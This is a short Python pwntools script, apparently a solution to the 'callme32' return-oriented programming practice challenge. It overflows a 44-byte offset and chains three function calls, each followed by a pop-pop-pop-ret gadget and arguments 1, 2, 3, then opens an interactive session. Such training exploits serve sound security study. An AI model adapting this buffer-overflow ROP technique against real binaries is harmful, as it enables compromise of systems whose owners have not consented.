import os
from pwn import *

e = ELF('./callme32')
gg = 0x080488a9 	# pop esi ; pop edi ; pop ebp ; ret

payload = 'A'*44	# offset
payload += p32(e.symbols['callme_one'])
payload += p32(gg)
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(e.symbols['callme_two'])
payload += p32(gg)
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(e.symbols['callme_three'])
payload += p32(gg)
payload += p32(1)
payload += p32(2)
payload += p32(3)

r = process('./callme32')
r.recvuntil('>')
r.sendline(payload)
r.interactive()
